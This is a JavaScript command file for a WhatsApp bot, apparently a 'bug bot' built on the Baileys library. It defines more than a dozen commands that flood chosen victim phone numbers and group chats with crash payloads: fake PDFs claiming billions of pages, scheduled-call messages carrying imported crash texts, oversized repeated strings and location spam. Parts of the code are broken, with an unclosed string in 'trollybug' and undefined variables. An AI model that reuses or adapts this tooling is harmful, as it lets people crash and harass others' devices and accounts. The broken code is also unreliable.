const { delay, loading, react } = require("../data/utils");
const moment = require("moment-timezone");
const config = require("../config");
const fs = require("fs");
const path = require("path");
const {
  generateWAMessageFromContent,
  proto,
} = require("@whiskeysockets/baileys");

const { cmd, commands } = require('../command'); // asire w ke cmd enpòte

// Bug texts & PDFs
const { bugtext1 } = require("../bugs/bugtext1");
const { bugtext2 } = require("../bugs/bugtext2");
const { bugtext3 } = require("../bugs/bugtext3");
const { bugtext4 } = require("../bugs/bugtext4");
const { bugtext5 } = require("../bugs/bugtext5");
const { bugtext6 } = require("../bugs/bugtext6");
const { bugpdf } = require("../bugs/bugpdf");

// Messages and regex
const mess = {
  prem: "You are not authorised to use this command !!!",
};

const phoneRegex = /^\d+$/; // Pi jeneral pou nimewo telefòn (chif sèlman)

const timewisher = (time) => {
  if (time < "05:00:00") return `Good Morning 🌄`;
  else if (time < "11:00:00") return `Good Morning 🏞️`;
  else if (time < "15:00:00") return `Good Afternoon 🌅`;
  else if (time < "18:00:00") return `Good Evening 🌆`;
  else if (time <= "23:59:59") return `Good Night 🌃`;
};

// Parse victims numbers from string
function parseVictims(str) {
  return str.split(",").map(x => x.trim().replace(/\D/g, "")).filter(x => x.length > 0);
}

// Fonksyon pou voye bug atravè relayMessage (ak generateWAMessageFromContent)
async function relaybug(dest, zk, ms, repondre, amount, victims, bug) {
  for (let i = 0; i < victims.length; i++) {
    if (!phoneRegex.test(victims[i])) {
      await repondre(`${victims[i]} not a valid phone number`);
      continue;
    }
    const victim = victims[i] + "@s.whatsapp.net";
    for (let j = 0; j < amount; j++) {
      const scheduledCallCreationMessage = generateWAMessageFromContent(
        dest,
        proto.Message.fromObject(bug),
        { userJid: dest, quoted: ms }
      );
      try {
        await zk.relayMessage(
          victim,
          scheduledCallCreationMessage.message,
          { messageId: scheduledCallCreationMessage.key.id }
        );
      } catch (e) {
        await repondre(
          `An error occured while sending bugs to ${victims[i]}`
        );
        console.log(`Error sending bug to ${victim}: ${e}`);
        break;
      }
      await delay(3000);
    }
    if (victims.length > 1)
      await repondre(`${amount} bugs sent to ${victims[i]} Successfully.`);
    await delay(5000);
  }
  await repondre(`Successfully sent ${amount} bugs to ${victims.join(", ")}.`);
}

// Fonksyon voye bug dirèkteman ak zk.sendMessage
async function sendbug(dest, zk, ms, repondre, amount, victims, bug) {
  for (let i = 0; i < victims.length; i++) {
    if (!phoneRegex.test(victims[i])) {
      await repondre(`${victims[i]} not a valid phone number`);
      continue;
    }
    const victim = victims[i] + "@s.whatsapp.net";
    for (let j = 0; j < amount; j++) {
      try {
        await zk.sendMessage(victim, bug);
      } catch (e) {
        await repondre(
          `An error occured while sending bugs to ${victims[i]}`
        );
        console.log(`Error sending bug to ${victim}: ${e}`);
        break;
      }
      await delay(3000);
    }
    if (victims.length > 1)
      await repondre(`${amount} bugs sent to ${victims[i]} Successfully.`);
    await delay(5000);
  }
  await repondre(`Successfully sent ${amount} bugs to ${victs.join(", ")}.`);
}

// ==== KOMAND yo ====

// BUG MENU
cmd({
  pattern: "BMBbugs",
  categorie: "menu",
  react: "🅱️",
  desc: "Show bug menu",
  filename: __filename,
}, async (conn, zk, m, { repondre }) => {
  const mono = "```";
  const time = moment().tz(config.TZ || "UTC").format("HH:mm:ss");
  const menuImage = fs.readFileSync(
    path.resolve(path.join(__dirname, "..", "media", "deleted-message.jpg"))
  );
  const tumbUrl =
    "https://i.ibb.co/wyYKzMY/68747470733a2f2f74656c656772612e70682f66696c652f6530376133643933336662346361643062333739312e6a7067.jpg";
  const menu = `${mono}Hello ${m.pushName || "User"}
${timewisher(time)}

≡𝙱𝚄𝙶 𝙼𝙴𝙽𝚄
bug
crash
loccrash
amountbug <amount>
crashbug <amount>|<number1,number2,...>
pmbug <amount>|<number1,number2,...>
delaybug <amount>|<number1,number2,...>
trollybug <amount>|<number1,number2,...>
docubug <amount>|<number1,number2,...>
unlimitedbug <amount>|<number1,number2,...>
bombug <amount>|<number1,number2,...>
lagbug <amount>|<number1,number2,...>
gcbug <grouplink>
delaygcbug <grouplink>
trollygcbug <grouplink>
laggcbug <grouplink>
bomgcbug <grouplink>
unlimitedgcbug <grouplink>
docugcbug <grouplink>${mono}`;

  await zk.sendMessage(
    m.chat,
    {
      image: menuImage,
      caption: menu,
      contextInfo: {
        mentionedJid: [m.key.remoteJid],
        forwardingScore: 9999999,
        isForwarded: true,
        externalAdReply: {
          showAdAttribution: true,
          title: `${config.BOT || "BOT"}`,
          body: `Bot Created By ${config.OWNER_NAME || "Owner"}`,
          thumbnail: { url: tumbUrl },
          thumbnailUrl: tumbUrl,
          previewType: "PHOTO",
          sourceUrl: "https://whatsapp.com/channel/0029VbCHd5V1dAw132PB7M1B",
          mediaType: 1,
          renderLargerThumbnail: true,
        },
      },
    },
    { quoted: m }
  );
  await react(m.chat, zk, m, "🅱️");
});

// BUG (send document bugpdf many times)
cmd({
  pattern: "bug",
  categorie: "menu",
  react: "🛡️",
  desc: "Send bug PDF many times",
  filename: __filename,
}, async (conn, zk, m, { superUser, repondre }) => {
  if (!superUser) return await repondre(mess.prem);

  await loading(m.chat, zk);

  const doc = { url: "./config.js" };
  for (let i = 0; i < 25; i++) {
    await zk.sendMessage(
      m.chat,
      {
        document: doc,
        mimetype: "application/pdf",
        title: "bx.pdf",
        fileName: "bx.pdf",
        pageCount: 9999999999,
        thumbnail: {
          url: "https://i.ibb.co/wyYKzMY/68747470733a2f2f74656c656772612e70682f66696c652f6530376133643933336662346361643062333739312e6a7067.jpg",
        },
        jpegThumbnail: {
          url: "https://i.ibb.co/wyYKzMY/68747470733a2f2f74656c656772612e70682f66696c652f6530376133643933336662346361643062333739312e6a7067.jpg",
        },
        mediaKey: "ht55w7B6UoaG9doQuVQ811XNfWcoALqcdQfd61seKKk=",
      },
      { quoted: m }
    );
  }
  await zk.sendMessage(m.chat, { react: { text: "🅱️", key: m.key } });
});

// CRASH (send text bug repeatedly)
cmd({
  pattern: "crash",
  categorie: "menu",
  react: "🛡️",
  desc: "Send text bugs repeatedly",
  filename: __filename,
}, async (conn, zk, m, { superUser, repondre }) => {
  if (!superUser) return await repondre(mess.prem);

  await loading(m.chat, zk);

  for (let i = 0; i < 10; i++) {
    await repondre(bugtext6);
  }

  await react(m.chat, zk, m, "🛡️");
});

// LOCCRASH (send location spam crash)
cmd({
  pattern: "loccrash",
  categorie: "menu",
  react: "📍",
  desc: "Send crashing location spam",
  filename: __filename,
}, async (conn, zk, m, { superUser, repondre }) => {
  if (!superUser) return await repondre(mess.prem);

  await loading(m.chat, zk);

  for (let i = 0; i < 20; i++) {
    for (let j = 0; j < 3; j++) {
      await zk.sendMessage(
        m.chat,
        {
          location: {
            degreesLatitude: -6.28282828,
            degreesLongitude: -1.2828,
            name: "BRUX0N3RD",
          },
        },
        { quoted: m }
      );
    }
  }
  await react(m.chat, zk, m, "📍");
});

// CRASHBUG (send crashbug document to numbers)
cmd({
  pattern: "crashbug",
  categorie: "menu",
  react: "🛡️",
  desc: "Send crashbug to numbers",
  filename: __filename,
}, async (conn, zk, m, { arg, superUser, repondre, prefixe }) => {
  if (!superUser) return await repondre(mess.prem);
  if (!arg[0] || !arg.join(" ").includes("|"))
    return await repondre(`Use ${prefixe}crashbug amount|number1,number2,...`);

  const doc = { url: "./config.js" };
  const bug = {
    document: doc,
    mimetype: "application/pdf",
    fileName: "bug.pdf",
    pageCount: 999999999,
  };

  const text = arg.join("");
  let amount = 30;
  let victims = [];

  if (arg.length === 1) {
    victims.push(arg[0]);
  } else {
    amount = parseInt(text.split("|")[0].trim());
    victims = parseVictims(text.split("|")[1]);
  }

  await repondre(`Sending ${amount} bugs to: ${victims.join(", ")}`);
  await sendbug(m.chat, zk, m, repondre, amount, victims, bug);
  await react(m.chat, zk, m, "✅");
});

// AMOUNTBUG (send X local bugs)
cmd({
  pattern: "amountbug",
  categorie: "menu",
  react: "🛡️",
  desc: "Send X local bugs",
  filename: __filename,
}, async (conn, zk, m, { arg, superUser, repondre }) => {
  if (!superUser) return await repondre(mess.prem);

  const amount = parseInt(arg[0]);
  if (isNaN(amount) || amount > config.BOOM_MESSAGE_LIMIT || amount < 1) {
    return await repondre(
      `Use valid integer between 1-${config.BOOM_MESSAGE_LIMIT}`
    );
  }

  const bug = bugtext1;

  for (let i = 0; i < amount; i++) {
    const message = generateWAMessageFromContent(
      m.chat,
      proto.Message.fromObject({
        scheduledCallCreationMessage: {
          callType: "2",
          scheduledTimestampMs: moment().tz("Asia/Kolkata").valueOf(),
          title: bug,
        },
      }),
      { userJid: m.chat, quoted: m }
    );
    await zk.relayMessage(m.chat, message.message, { messageId: message.key.id });
    await delay(3000);
  }
  await react(m.chat, zk, m, "🛡️");
});


// PMBUG (send bug via PM)
cmd({
  pattern: "pmbug",
  categorie: "menu",
  react: "🛡️",
  desc: "Send bug via PM",
  filename: __filename,
}, async (conn, zk, m, { arg, superUser, repondre, prefixe }) => {
  if (!superUser) return await repondre(mess.prem);
  if (!arg[0] || !arg.join(" ").includes("|")) return await repondre(`Use ${prefixe}pmbug amount|number1,number2,...`);

  const text = arg.join("");
  let amount = 30;
  let victims = [];
  const bug = {
    scheduledCallCreationMessage: {
      callType: "2",
      scheduledTimestampMs: moment().tz("Asia/Kolkata").valueOf(),
      title: bugtext1,
    },
  };

  if (arg.length === 1) {
    victims.push(arg[0]);
  } else {
    amount = parseInt(text.split("|")[0].trim());
    victims = parseVictims(text.split("|")[1]);
  }

  await repondre(`Sending ${amount} bugs to: ${victims.join(", ")}`);
  await relaybug(m.chat, zk, m, repondre, amount, victims, bug);
  await react(m.chat, zk, m, "🛡️");
});

// trollybug (send long spam message to numbers)
cmd({
  pattern: "trollybug",
  categorie: "menu",
  react: "🧻",
  desc: "Send long scroll spam to numbers",
  filename: __filename,
}, async (conn, zk, m, { arg, superUser, repondre, prefixe }) => {
  if (!superUser) return await repondre(mess.prem);
  if (!arg[0] || !arg.join(" ").includes("|")) return await repondre(`Use ${prefixe}trollybug amount|number1,number2,...`);

  const [amountStr, numsStr] = arg.join(" ").split("|").map(s => s.trim());
  if (!amountStr || !numsStr) return await repondre(`Wrong format. Use: ${prefixe}trollybug amount|number1,number2

// docubug (send document spam to numbers)
cmd({
  pattern: "docubug",
  categorie: "menu",
  react: "📄",
  desc: "Send document spam to numbers",
  filename: __filename,
}, async (conn, zk, m, { arg, superUser, repondre, prefixe }) => {
  if (!superUser) return await repondre(mess.prem);
  if (!arg[0]) return await repondre(`Use ${prefixe}docubug amount|number1,number2,...`);

  const [amountStr, numsStr] = arg.join(" ").split("|").map(s => s.trim());
  if (!amountStr || !numsStr) return await repondre(`Wrong format. Use: ${prefixe}docubug amount|number1,number2,...`);

  const amount = parseInt(amountStr);
  if (isNaN(amount) || amount < 1) return await repondre("Invalid amount");
  const victims = parseVictims(numsStr);

  // Example document url or local file path
  const doc = { url: "./config.js" };

  for (const victimNum of victims) {
    const victim = victimNum + "@s.whatsapp.net";
    for (let i = 0; i < amount; i++) {
      try {
        await zk.sendMessage(victim, {
          document: doc,
          mimetype: "application/pdf",
          fileName: "bug.pdf",
          pageCount: 999999999,
        });
        await delay(1500);
      } catch (e) {
        await repondre(`Error sending to ${victimNum}: ${e.message}`);
        break;
      }
    }
  }
  await react(m.chat, zk, m, "✅");
  await repondre(`Sent docubug x${amount} to:\n${victims.join(", ")}`);
});

// unlimitedbug (send unlimited spam to numbers)
cmd({
  pattern: "unlimitedbug",
  categorie: "menu",
  react: "♾️",
  desc: "Send unlimited spam to numbers",
  filename: __filename,
}, async (conn, zk, m, { arg, superUser, repondre, prefixe }) => {
  if (!superUser) return await repondre(mess.prem);
  if (!arg[0]) return await repondre(`Use ${prefixe}unlimitedbug amount|number1,number2,...`);

  const [amountStr, numsStr] = arg.join(" ").split("|").map(s => s.trim());
  if (!amountStr || !numsStr) return await repondre(`Wrong format. Use: ${prefixe}unlimitedbug amount|number1,number2,...`);

  const amount = parseInt(amountStr);
  if (isNaN(amount) || amount < 1) return await repondre("Invalid amount");
  const victims = parseVictims(numsStr);

  for (const victimNum of victims) {
    const victim = victimNum + "@s.whatsapp.net";
    for (let i = 0; i < amount; i++) {
      try {
        await zk.sendMessage(victim, { text: "♾️ Unlimited Bug Spam ♾️" });
        await delay(500);
      } catch (e) {
        await repondre(`Error sending to ${victimNum}: ${e.message}`);
        break;
      }
    }
  }
  await react(m.chat, zk, m, "✅");
  await repondre(`Sent unlimitedbug x${amount} to:\n${victims.join(", ")}`);
});

// bombug (send bomb spam to numbers)
cmd({
  pattern: "bombug",
  categorie: "menu",
  react: "💣",
  desc: "Send bomb spam to numbers",
  filename: __filename,
}, async (conn, zk, m, { arg, superUser, repondre, prefixe }) => {
  if (!superUser) return await repondre(mess.prem);
  if (!arg[0]) return await repondre(`Use ${prefixe}bombug amount|number1,number2,...`);

  const [amountStr, numsStr] = arg.join(" ").split("|").map(s => s.trim());
  if (!amountStr || !numsStr) return await repondre(`Wrong format. Use: ${prefixe}bombug amount|number1,number2,...`);

  const amount = parseInt(amountStr);
  if (isNaN(amount) || amount < 1) return await repondre("Invalid amount");
  const victims = parseVictims(numsStr);

  for (const victimNum of victims) {
    const victim = victimNum + "@s.whatsapp.net";
    for (let i = 0; i < amount; i++) {
      try {
        await zk.sendMessage(victim, { text: "💣 Bomb Bug Incoming 💣" });
        await delay(800);
      } catch (e) {
        await repondre(`Error sending to ${victimNum}: ${e.message}`);
        break;
      }
    }
  }
  await react(m.chat, zk, m, "✅");
  await repondre(`Sent bombug x${amount} to:\n${victims.join(", ")}`);
});

// lagbug (send lag-inducing spam to numbers)
cmd({
  pattern: "lagbug",
  categorie: "menu",
  react: "🐢",
  desc: "Send lag spam to numbers",
  filename: __filename,
}, async (conn, zk, m, { arg, superUser, repondre, prefixe }) => {
  if (!superUser) return await repondre(mess.prem);
  if (!arg[0]) return await repondre(`Use ${prefixe}lagbug amount|number1,number2,...`);

  const [amountStr, numsStr] = arg.join(" ").split("|").map(s => s.trim());
  if (!amountStr || !numsStr) return await repondre(`Wrong format. Use: ${prefixe}lagbug amount|number1,number2,...`);

  const amount = parseInt(amountStr);
  if (isNaN(amount) || amount < 1) return await repondre("Invalid amount");
  const victims = parseVictims(numsStr);

  const lagMsg = "🐢 Lag Bug ".repeat(150);

  for (const victimNum of victims) {
    const victim = victimNum + "@s.whatsapp.net";
    for (let i = 0; i < amount; i++) {
      try {
        await zk.sendMessage(victim, { text: lagMsg });
        await delay(1000);
      } catch (e) {
        await repondre(`Error sending to ${victimNum}: ${e.message}`);
        break;
      }
    }
  }
  await react(m.chat, zk, m, "✅");
  await repondre(`Sent lagbug x${amount} to:\n${victims.join(", ")}`);
});

// === GROUP BUGS === //

// Helper to send message to group link (or jid)
async function sendToGroup(zk, groupJid, message, times = 10, delayMs = 2000) {
  for (let i = 0; i < times; i++) {
    try {
      await zk.sendMessage(groupJid, message);
      await delay(delayMs);
    } catch (e) {
      break; // stop on error
    }
  }
}

// gcbug (send bug spam to group)
cmd({
  pattern: "gcbug",
  categorie: "menu",
  react: "💥",
  desc: "Send bug spam to group",
  filename: __filename,
}, async (conn, zk, m, { arg, superUser, repondre, prefixe }) => {
  if (!superUser) return await repondre(mess.prem);
  if (!arg[0]) return await repondre(`Use ${prefixe}gcbug <grouplink>`);

  const groupJid = arg[0].includes("@g.us") ? arg[0] : arg[0] + "@g.us";
  await sendToGroup(zk, groupJid, { text: bugTextSample });
  await react(m.chat, zk, m, "✅");
  await repondre(`Sent bug spam to group ${groupJid}`);
});

// delaygcbug (send delayed spam to group)
cmd({
  pattern: "delaygcbug",
  categorie: "menu",
  react: "⏱️",
  desc: "Send delayed bug spam to group",
  filename: __filename,
}, async (conn, zk, m, { arg, superUser, repondre, prefixe }) => {
  if (!superUser) return await repondre(mess.prem);
  if (!arg[0]) return await repondre(`Use ${prefixe}delaygcbug <grouplink>`);

  const groupJid = arg[0].includes("@g.us") ? arg[0] : arg[0] + "@g.us";

  for (let i = 0; i < 10; i++) {
    try {
      await zk.sendMessage(groupJid, { text: `⏱️ Delayed bug spam ${i + 1}` });
      await delay(2000);
    } catch (e) {
      break;
    }
  }
  await react(m.chat, zk, m, "✅");
  await repondre(`Sent delayed bug spam to group ${groupJid}`);
});

// trollygcbug (send trolly spam to group)
cmd({
  pattern: "trollygcbug",
  categorie: "menu",
  react: "🧻",
  desc: "Send trolly spam to group",
  filename: __filename,
}, async (conn, zk, m, { arg, superUser, repondre, prefixe }) => {
  if (!superUser) return await repondre(mess.prem);
  if (!arg[0]) return await repondre(`Use ${prefixe}trollygcbug <grouplink>`);

  const groupJid = arg[0].includes("@g.us") ? arg[0] : arg[0] + "@g.us";
  const trollyMsg = "🧻 Dawens ".repeat(400);

  await sendToGroup(zk, groupJid, { text: trollyMsg });
  await react(m.chat, zk, m, "✅");
  await repondre(`Sent trolly spam to group ${groupJid}`);
});

// laggcbug (send lag spam to group)
cmd({
  pattern: "laggcbug",
  categorie: "menu",
  react: "🐢",
  desc: "Send lag spam to group",
  filename: __filename,
}, async (conn, zk, m, { arg, superUser, repondre, prefixe }) => {
  if (!superUser) return await repondre(mess.prem);
  if (!arg[0]) return await repondre(`Use ${prefixe}laggcbug <grouplink>`);

  const groupJid = arg[0].includes("@g.us") ? arg[0] : arg[0] + "@g.us";
  const lagMsg = "🐢 Lag Bug Group ".repeat(200);

  await sendToGroup(zk, groupJid, { text: lagMsg });
  await react(m.chat, zk, m, "✅");
  await repondre(`Sent lag spam to group ${groupJid}`);
});

// bomgcbug (send bomb spam to group)
cmd({
  pattern: "bomgcbug",
  categorie: "menu",
  react: "💣",
  desc: "Send bomb spam to group",
  filename: __filename,
}, async (conn, zk, m, { arg, superUser, repondre, prefixe }) => {
  if (!superUser) return await repondre(mess.prem);
  if (!arg[0]) return await repondre(`Use ${prefixe}bomgcbug <grouplink>`);

  const groupJid = arg[0].includes("@g.us") ? arg[0] : arg[0] + "@g.us";

  for (let i = 0; i < 20; i++) {
    try {
      await zk.sendMessage(groupJid, { text: "💣 Bomb spam in group!" });
      await delay(1500);
    } catch (e) {
      break;
    }
  }
  await react(m.chat, zk, m, "✅");
  await repondre(`Sent bomb spam to group ${groupJid}`);
});

// unlimitedgcbug (send unlimited spam to group)
cmd({
  pattern: "unlimitedgcbug",
  categorie: "menu",
  react: "♾️",
  desc: "Send unlimited spam to group",
  filename: __filename,
}, async (conn, zk, m, { arg, superUser, repondre, prefixe }) => {
  if (!superUser) return await repondre(mess.prem);
  if (!arg[0]) return await repondre(`Use ${prefixe}unlimitedgcbug <grouplink>`);

  const groupJid = arg[0].includes("@g.us") ? arg[0] : arg[0] + "@g.us";

  for (let i = 0; i < 50; i++) {
    try {
      await zk.sendMessage(groupJid, { text: "♾️ Unlimited spam in group ♾️" });
      await delay(700);
    } catch (e) {
      break;
    }
  }
  await react(m.chat, zk, m, "✅");
  await repondre(`Sent unlimited spam to group ${groupJid}`);
});

// docugcbug (send doc spam to group)
cmd({
  pattern: "docugcbug",
  categorie: "menu",
  react: "📄",
  desc: "Send document spam to group",
  filename: __filename,
}, async (conn, zk, m, { arg, superUser, repondre, prefixe }) => {
  if (!superUser) return await repondre(mess.prem);
  if (!arg[0]) return await repondre(`Use ${prefixe}docugcbug <grouplink>`);

  const groupJid = arg[0].includes("@g.us") ? arg[0] : arg[0] + "@g.us";

  const doc = { url: "./config.js" };

  for (let i = 0; i < 10; i++) {
    try {
      await zk.sendMessage(groupJid, {
        document: doc,
        mimetype: "application/pdf",
        fileName: "bugGroup.pdf",
      });
      await delay(1500);
    } catch (e) {
      break;
    }
  }
  await react(m.chat, zk, m, "✅");
  await repondre(`Sent document spam to group ${groupJid}`);
});

// DELAYBUG (send delayed bug spam)
cmd({
  pattern: "delaybug",
  categorie: "menu",
  react: "🕷️",
  desc: "Send delayed bug spam",
  filename: __filename,
}, async (conn, zk, m, { arg, superUser, repondre, prefixe }) => {
  if (!superUser) return await repondre(mess.prem);
  if (!arg[0]) return await repondre(`Use ${prefixe}delaybug amount|number1,number2,...`);

  const [amt, nums] = arg.join(" ").split("|").map((x) => x.trim());
  if (!nums) return await repondre(`You must specify victim numbers separated by commas.`);

  const amount = parseInt(amt) || 30;
  const victims = nums.split(",").map((x) => x.replace(/\D/g, ""));

  const bug = {
    scheduledCallCreationMessage: {
      callType: "2",
      scheduledTimestampMs: moment().tz("Asia/Kolkata").valueOf(),
      title: bugtext1,
    },
  };

  for (let i = 0; i < amount; i++) {
    for (const victimNum of victims) {
      const victim = victimNum + "@s.whatsapp.net";
      await delay(200);
      try {
        await zk.sendMessage(victim, bug);
      } catch (e) {
        await repondre(`Error sending to ${victimNum}: ${e.message}`);
      }
    }
  }
  await react(m.chat, zk, m, "✅");
  await repondre(`🕷️ Sent ${amount} bug(s) to:\n${victims.join("\n")}`);
});
